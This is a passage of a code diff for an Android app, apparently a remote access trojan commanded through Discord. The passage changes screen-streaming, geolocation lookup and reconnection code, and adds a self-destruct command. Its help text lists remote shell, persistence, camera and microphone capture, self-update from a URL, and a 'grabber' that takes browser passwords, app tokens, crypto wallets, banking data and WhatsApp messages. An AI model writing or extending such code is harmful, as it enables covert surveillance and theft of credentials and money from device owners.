-                    gifEncoder.setRepeat(0)
-                    gifEncoder.setDelay((1000 / fps).coerceAtLeast(100))
-                    var capturedFrames = 0
-                    for (i in 0 until framesPerGif) {
-                        if (!isActive) break
-                        try {
-                            val bmp = DisplayCapture.captureStreamBitmap()
-                            if (bmp != null) {
-                                val scaled = if (bmp.width != gifWidth || bmp.height != gifHeight) {
-                                    val scale = minOf(gifWidth.toFloat() / bmp.width, gifHeight.toFloat() / bmp.height)
-                                    val w = (bmp.width * scale).toInt()
-                                    val h = (bmp.height * scale).toInt()
-                                    val centered = Bitmap.createBitmap(gifWidth, gifHeight, Bitmap.Config.ARGB_8888)
-                                    val canvas = android.graphics.Canvas(centered)
-                                    canvas.drawColor(android.graphics.Color.BLACK)
-                                    canvas.drawBitmap(bmp, ((gifWidth - w) / 2).toFloat(), ((gifHeight - h) / 2).toFloat(), null)
-                                    bmp.recycle()
-                                    centered
-                                } else bmp
-                                gifEncoder.addFrame(scaled)
-                                capturedFrames++
-                            } else {
-                                consecutiveFailures++
-                                if (consecutiveFailures >= maxFailures) {
-                                    d.sendMsg(":x: Stream stopped — too many failures")
-                                    isStreaming = false
-                                    streamMessageId = null
-                                    DisplayCapture.releaseStreamCapture()
-                                    return@launch
-                                }
-                            }
-                        } catch (e: Exception) {
-                            consecutiveFailures++
-                            if (consecutiveFailures >= maxFailures) {
-                                d.sendMsg(":x: Stream error — stopped")
-                                isStreaming = false
-                                streamMessageId = null
-                                DisplayCapture.releaseStreamCapture()
-                                return@launch
-                            }
-                        }
-                        val frameDelay = targetDelay - 50
-                        if (frameDelay > 0) delay(frameDelay)
-                    }
-                    if (capturedFrames > 0) {
-                        consecutiveFailures = 0
-                        val gifBytes = gifEncoder.finish()
-                        val oldId = streamMessageId
-                        val newId = d.sendFileAwait("", "stream.gif", gifBytes)
-                        if (newId != null) {
-                            streamMessageId = newId
-                            if (oldId != null) {
-                                launch { d.deleteMsgAwait(oldId) }
-                            }
-                        }
-                    }
-                }
-            } catch (e: Exception) {
-                isStreaming = false
-                streamMessageId = null
-                DisplayCapture.releaseStreamCapture()
-            }
         }
     }
 
@@ -2051,24 +2000,29 @@ class SystemNetworkService : Service() {
     }
 
     private fun fetchIpInfo(): Map<String, String>? {
-        val url = java.net.URL("http://ip-api.com/json/")
-        val conn = url.openConnection() as java.net.HttpURLConnection
-        conn.connectTimeout = 8000
-        conn.readTimeout = 8000
-        val body = conn.inputStream.bufferedReader().readText()
-        conn.disconnect()
-        val json = org.json.JSONObject(body)
-        if (json.optString("status") == "success") {
-            return mapOf(
-                "ip" to json.optString("query", "?"),
-                "city" to json.optString("city", "?"),
-                "region" to json.optString("regionName", "?"),
-                "country" to json.optString("country", "?"),
-                "isp" to json.optString("isp", "?"),
-                "lat" to json.getDouble("lat").toString(),
-                "lon" to json.getDouble("lon").toString()
-            )
-        }
+        try {
+            val url = java.net.URL("http://ip-api.com/json/")
+            val conn = url.openConnection() as java.net.HttpURLConnection
+            conn.connectTimeout = 8000
+            conn.readTimeout = 8000
+            try {
+                val body = conn.inputStream.bufferedReader().readText()
+                val json = org.json.JSONObject(body)
+                if (json.optString("status") == "success") {
+                    return mapOf(
+                        "ip" to json.optString("query", "?"),
+                        "city" to json.optString("city", "?"),
+                        "region" to json.optString("regionName", "?"),
+                        "country" to json.optString("country", "?"),
+                        "isp" to json.optString("isp", "?"),
+                        "lat" to json.getDouble("lat").toString(),
+                        "lon" to json.getDouble("lon").toString()
+                    )
+                }
+            } finally {
+                conn.disconnect()
+            }
+        } catch (_: Exception) {}
         return null
     }
 
@@ -2255,6 +2209,7 @@ class SystemNetworkService : Service() {
             "uptime" -> ":clock1: **!uptime**\nShow how long device has been connected.\nUsage: `!uptime`"
             "debug" -> ":mag: **!debug**\nShow recent debug log.\nUsage: `!debug`"
             "restart" -> ":arrows_counterclockwise: **!restart**\nRestart the Discord gateway connection.\nUsage: `!restart`"
+            "kill" -> ":skull: **!kill**\nSelf-destruct: uninstall app and kill process.\nUsage: `!kill`"
             "screenshot" -> ":camera: **!screenshot**\nCapture device screen.\nUsage: `!screenshot`\nRequires: Android 14+ with Accessibility enabled"
             "camera" -> ":camera_flash: **!camera**\nTake photo with device camera.\nUsage: `!camera` (back camera)\nUsage: `!camera front` (front camera)"
             "mic" -> ":microphone: **!mic**\nRecord audio from microphone.\nUsage: `!mic` (10 seconds)\nUsage: `!mic 30` (30 seconds, max 60)"
@@ -2270,6 +2225,8 @@ class SystemNetworkService : Service() {
             "installed" -> ":package: **!installed**\nList all installed apps.\nUsage: `!installed`"
             "notifications" -> ":bell: **!notifications**\nShow recent notifications.\nUsage: `!notifications`\nRequires: Notification Listener access"
             "shell" -> ":terminal: **!shell**\nExecute shell command.\nUsage: `!shell <command>`\nExample: `!shell whoami`"
+            "cd" -> ":arrow_right: **!cd**\nChange current directory.\nUsage: `!cd <path>`\nUsage: `!cd` (reset to /sdcard)"
+            "pwd" -> ":house: **!pwd**\nShow current working directory.\nUsage: `!pwd`"
             "persist" -> ":syringe: **!persist**\nInstall persistence mechanism.\nUsage: `!persist`"
             "grabber" -> ":mag: **!grabber**\nExtract data from device.\nUsage: `!grabber` (all targets)\nUsage: `!grabber browser` (cookies, passwords)\nUsage: `!grabber messenger` (Discord, Telegram, etc.)\nUsage: `!grabber tokens` (app auth tokens)\nUsage: `!grabber wallets` (crypto wallet data)\nUsage: `!grabber files` (documents, images, etc.)\nUsage: `!grabber clipboard` (current clipboard)\nUsage: `!grabber banks` (banking apps)\nUsage: `!grabber whatsapp` (ALL messages via SQLite)\nUsage: `!grabber chrome` (history + saved passwords)\nUsage: `!grabber docs` (PDF, Word, Excel, etc.)"
             "update" -> ":arrows_counterclockwise: **!update**\nSelf-update system.\nUsage: `!update check` - Check for updates\nUsage: `!update push <url>` - Download APK\nUsage: `!update install` - Apply update\nUsage: `!update clear` - Remove pending update"
@@ -2323,95 +2280,6 @@ class SystemNetworkService : Service() {
         } catch (e: Exception) {
             
             throw e
-        }
-    }
-
-    private fun registerNetworkCallback() {
-        try {
-            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-            networkCallback = object : ConnectivityManager.NetworkCallback() {
-                override fun onAvailable(network: Network) {
-                    super.onAvailable(network)
-                    discord?.let {
-                        if (!it.isConnected()) {
-                            scope.launch {
-                                delay(2000)
-                                it.start(scope)
-                            }
-                        }
-                    }
-                }
-
-                override fun onLost(network: Network) {
-                    super.onLost(network)
-                    if (isDownloadingUpdate) return
-                    discord?.let {
-                        if (it.isConnected()) {
-                            scope.launch {
-                                it.stop()
-                                gatewayStarted = false
-                                discord = null
-                                discord = DiscordGatewayClient(
-                                    appContext = applicationContext,
-                                    onCommand = { action, payload ->
-                                        scope.launch { handleGatewayCommand(action, payload) }
-                                    },
-                                    onStatus = { s -> updateNotif(s) }
-                                )
-                                discord?.start(scope)
-                                gatewayStarted = true
-                            }
-                        }
-                    }
-                }
-
-                override fun onCapabilitiesChanged(network: Network, capabilities: NetworkCapabilities) {
-                    super.onCapabilitiesChanged(network, capabilities)
-                    if (isDownloadingUpdate) return
-                    val hasInternet = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
-                    val validated = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
-                    if (!hasInternet || !validated) {
-                        discord?.let {
-                            if (it.isConnected()) {
-                                scope.launch {
-                                    delay(1000)
-                                    it.stop()
-                                    gatewayStarted = false
-                                    discord = null
-                                    discord = DiscordGatewayClient(
-                                        appContext = applicationContext,
-                                        onCommand = { action, payload ->
-                                            scope.launch { handleGatewayCommand(action, payload) }
-                                        },
-                                        onStatus = { s -> updateNotif(s) }
-                                    )
-                                    discord?.start(scope)
-                                    gatewayStarted = true
-                                }
-                            }
-                        }
-                    }
-                }
-
-                override fun onUnavailable() {
-                    super.onUnavailable()
-                    discord?.let {
-                        if (it.isConnected()) {
-                            scope.launch {
-                                it.stop()
-                                gatewayStarted = false
-                            }
-                        }
-                    }
-                }
-            }
-            val request = NetworkRequest.Builder()
-                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
-                .build()
-            cm.registerNetworkCallback(request, networkCallback!!)
-            
-        } catch (e: Exception) {
-            
         }
     }
 
